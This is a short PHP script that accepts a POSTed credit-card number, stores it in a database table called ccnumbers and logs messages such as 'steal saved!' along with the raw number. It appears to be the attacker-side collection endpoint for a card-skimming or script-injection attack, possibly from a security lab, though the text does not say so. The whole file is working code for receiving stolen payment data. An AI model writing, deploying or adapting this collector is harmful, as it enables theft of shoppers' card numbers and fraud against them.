<?php

require_once 'db.php';

if (isset($_POST['cc'])) {

    $conn = get_db_connection();
    $statement = $conn->prepare("INSERT INTO ccnumbers (cc) VALUES (:cc)");
    $result = $statement->execute(array('cc' => $_POST['cc']));

    if ($result) {
        error_log("steal saved! " . $_POST['cc']);
    } else {
        error_log("Failed to steal!");
    }
} else {
    error_log("steal request had no parameter");
}

?>